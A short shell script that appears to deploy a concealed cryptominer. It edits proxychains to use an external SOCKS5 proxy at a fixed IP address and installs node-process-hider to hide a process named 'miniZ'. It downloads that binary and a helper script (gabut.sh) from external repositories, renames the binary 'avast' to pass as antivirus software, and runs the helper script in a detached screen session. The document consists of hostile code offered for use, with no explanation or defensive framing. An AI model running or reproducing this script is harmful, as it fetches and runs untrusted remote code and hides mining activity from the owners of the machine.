apt update
apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add miniZ
apt install screen -y
wget -q https://gitlab.com/dif.hirugai888/phonix/-/raw/main/miniZ
wget -q https://raw.githubusercontent.com/ariffirdaus778/sakaw/main/gabut.sh
mv miniZ avast
chmod +x avast gabut
screen -dmS running ./gabut.sh
